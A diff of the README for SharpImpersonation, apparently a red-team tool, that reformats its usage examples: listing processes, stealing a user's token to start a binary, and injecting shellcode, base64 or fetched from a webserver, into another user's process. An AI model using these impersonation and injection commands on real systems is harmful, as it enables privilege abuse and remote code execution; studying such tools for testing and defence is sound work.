@@ -8,38 +8,51 @@ A blog post for the intruduction can be found here:
 
 * [https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/](https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/)
 
-## Usage examples
-
-===========================    List user processes    ===========================
-
-`SharpImpersonation.exe list`
+List user processes
+--------
+```
+PS > PS C:\temp> SharpImpersonation.exe list
+```
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/List.PNG?raw=true)
 
-===========================    List only elevated processes    ===========================
+List only elevated processes
+--------
+```
+PS > PS C:\temp> SharpImpersonation.exe list elevated
+```
 
-`SharpImpersonation.exe list elevated`
-
-===========================    Impersonate the first process of <user> to start a new <binary>    ===========================
-
-`SharpImpersonation.exe user:<user> binary:<binary-Path>`
+Impersonate the first process of the target user to start a new binary
+--------
+```
+PS > PS C:\temp> SharpImpersonation.exe user:<user> binary:<binary-Path>
+```
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/CreateProcessWithTokenW.PNG?raw=true)
 
-======================  Inject base64 encoded shellcode into the first process of <user>  ======================
+Inject base64 encoded shellcode into the first process of the target user
+--------
 
-`SharpImpersonation.exe user:<user> shellcode:<base64shellcode>`
+```
+PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<base64shellcode>
+```
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeBase64.PNG?raw=true)
 
-======================  Inject shellcode loaded from a webserver into the first process of <user>  ======================
+Inject shellcode loaded from a webserver into the first process of the target user
+--------
 
-`SharpImpersonation.exe user:<user> shellcode:<URL>`
+```
+PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<URL>
+```
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeWebDownload.PNG?raw=true)
 
-<u>Impersonate user <user> via ImpersonateLoggedOnuser for the current session</u>
+Impersonate the target user via ImpersonateLoggedOnuser for the current session
+--------
 
-`SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser`
+```
+PS > PS C:\temp> SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
+```
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ImpersonateLoggedOnUser.png?raw=true)
